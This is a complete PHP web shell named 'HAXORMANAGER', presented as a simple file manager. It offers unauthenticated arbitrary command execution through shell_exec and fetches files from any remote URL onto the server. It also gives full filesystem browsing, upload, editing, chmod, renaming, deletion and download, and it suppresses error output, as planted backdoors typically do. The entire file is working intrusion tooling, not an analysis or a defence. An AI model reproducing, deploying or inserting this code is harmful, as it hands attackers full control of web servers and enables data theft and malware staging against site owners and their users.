<?php
header("X-XSS-Protection: 1; mode=block");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");

ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

session_start();

// Sanitize input function
function sanitize_input($data) {
    return htmlspecialchars(trim($data));
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    session_regenerate_id(true);
    header("Location: ?");
    exit;
}

echo '<html><head><title>HAXORMANAGER</title>';
echo '<style>
body { font-family: Arial, sans-serif; background-color: #2c2f33; color: #fff; margin: 0; padding: 0; }
h1 { color: #7289da; text-align: center; }
input[type="text"], input[type="password"], input[type="url"], input[type="submit"], input[type="file"] { padding: 10px; margin: 10px; width: 300px; border-radius: 5px; border: none; }
input[type="submit"] { background-color: #7289da; color: white; cursor: pointer; }
table { width: 90%; margin: 20px auto; border-collapse: collapse; }
th, td { padding: 10px; text-align: left; border: 1px solid #444; color: #fff; }
th { background-color: #7289da; }
a { color: #7289da; text-decoration: none; }
a:hover { text-decoration: underline; }
.container { width: 80%; margin: 0 auto; }
textarea { font-size: 14px; width: 100%; height: 600px; background-color: #23272a; color: #eee; border: none; padding: 10px; }
</style></head><body>';

echo '<div class="container">';
echo '<h1>HAXORMANAGER</h1>';
echo '<p>This is a simple file manager tool created by HaxorNoname.</p>';

// Command execution form
echo '<form method="post">
<input type="text" name="cmd" placeholder="Enter command" required />
<input type="submit" value="Execute" />
</form>';

if (isset($_POST['cmd'])) {
    $command = sanitize_input($_POST['cmd']);
    echo '<pre>' . htmlspecialchars(shell_exec($command)) . '</pre>';
}

// Remote upload form
echo '<form method="post">
<input type="url" name="remote_url" placeholder="Remote File URL" required />
<input type="submit" value="Remote Upload" />
</form>';

if (isset($_POST['remote_url'])) {
    $remote_url = filter_var($_POST['remote_url'], FILTER_SANITIZE_URL);
    if (filter_var($remote_url, FILTER_VALIDATE_URL)) {
        $file_name = basename($remote_url);
        if (file_put_contents($file_name, fopen($remote_url, 'r'))) {
            echo '<p><font color="green">Remote file uploaded successfully as ' . $file_name . '</font></p>';
        } else {
            echo '<p><font color="red">Remote upload failed.</font></p>';
        }
    } else {
        echo '<p><font color="red">Invalid URL.</font></p>';
    }
}

// File/Folder search form
echo '<form method="get">
<input type="text" name="search" placeholder="Search files or folders" />
<input type="submit" value="Search" />
</form>';

// Display current path
$HX = isset($_GET['HX']) ? sanitize_input($_GET['HX']) : getcwd();
$HX = str_replace('\\', '/', $HX);
$paths = explode('/', $HX);

foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        echo '<a href="?HX=/">/</a>';
        continue;
    }
    if ($pat == '') continue;
    echo '<a href="?HX=';
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}

// Create new file or directory form
echo '<br><br><form method="post">
<input type="text" name="new_name" placeholder="Enter file/folder name" required />
<input type="submit" name="create_file" value="Create File" />
<input type="submit" name="create_dir" value="Create Directory" />
</form>';

if (isset($_POST['create_file'])) {
    $new_file = $HX . '/' . sanitize_input($_POST['new_name']);
    if (file_put_contents($new_file, '') !== false) {
        echo '<p><font color="green">File created successfully.</font></p>';
    } else {
        echo '<p><font color="red">Failed to create file.</font></p>';
    }
}

if (isset($_POST['create_dir'])) {
    $new_dir = $HX . '/' . sanitize_input($_POST['new_name']);
    if (mkdir($new_dir)) {
        echo '<p><font color="green">Directory created successfully.</font></p>';
    } else {
        echo '<p><font color="red">Failed to create directory.</font></p>';
    }
}

// File upload form
echo '<br><form enctype="multipart/form-data" method="POST">
<input type="file" name="file" required />
<input type="submit" value="Upload" />
</form>';

if (isset($_FILES['file'])) {
    $target_file = $HX . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo '<p><font color="green">File uploaded successfully.</font></p>';
    } else {
        echo '<p><font color="red">File upload failed.</font></p>';
    }
}

// Display file structure
echo '<table>';
$scandir = scandir($HX);
if (isset($_GET['search'])) {
    $search_query = strtolower($_GET['search']);
    $scandir = array_filter($scandir, function($file) use ($search_query) {
        return strpos(strtolower($file), $search_query) !== false;
    });
}
foreach ($scandir as $item) {
    if ($item == '.' || $item == '..') continue;
    $path = "$HX/$item";
    $isDir = is_dir($path) ? 'Directory' : 'File';
    $size = is_file($path) ? filesize($path) : '-';
    echo "<tr>
    <td>$isDir</td>
    <td><a href=\"?HX=$path\">$item</a></td>
    <td>$size</td>
    <td><a href=\"?option=edit&HX=$path\">Edit</a> |
    <a href=\"?option=chmod&HX=$path\">Chmod</a> |
    <a href=\"?option=rename&HX=$path\">Rename</a> |
    <a href=\"?option=delete&HX=$path\" onclick=\"return confirm('Are you sure?')\">Delete</a> |
    <a href=\"?download=$path\">Download</a>
    </td>
    </tr>";
}
echo '</table>';

// File download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename='.basename($file));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        flush();
        readfile($file);
        exit;
    } else {
        echo '<p><font color="red">File not found.</font></p>';
    }
}

// File operations (edit, chmod, rename, delete)
if (isset($_GET['option'])) {
    $option = $_GET['option'];
    $file = $_GET['HX'];

    if ($option == 'edit') {
        if (isset($_POST['new_content'])) {
            file_put_contents($file, $_POST['new_content']);
            echo '<p><font color="green">File edited successfully.</font></p>';
        }
        echo '<form method="post">
        <textarea name="new_content">'.htmlspecialchars(file_get_contents($file)).'</textarea>
        <input type="submit" value="Save Changes" />
        </form>';
    } elseif ($option == 'chmod') {
        if (isset($_POST['new_perms'])) {
            chmod($file, octdec($_POST['new_perms']));
            echo '<p><font color="green">Permissions changed successfully.</font></p>';
        }
        echo '<form method="post">
        <input type="text" name="new_perms" placeholder="Enter new permissions (e.g., 0755)" required />
        <input type="submit" value="Change Permissions" />
        </form>';
    } elseif ($option == 'rename') {
        if (isset($_POST['new_name'])) {
            $new_name = dirname($file).'/'.sanitize_input($_POST['new_name']);
            rename($file, $new_name);
            header("Location: ?HX=".dirname($new_name));
            exit;
        }
        echo '<form method="post">
        <input type="text" name="new_name" placeholder="Enter new name" required />
        <input type="submit" value="Rename" />
        </form>';
    } elseif ($option == 'delete') {
        if (is_dir($file)) {
            rmdir($file);
        } else {
            unlink($file);
        }
        header("Location: ?HX=".dirname($file));
        exit;
    }
}

echo '</div>';
echo '</body></html>';
?>
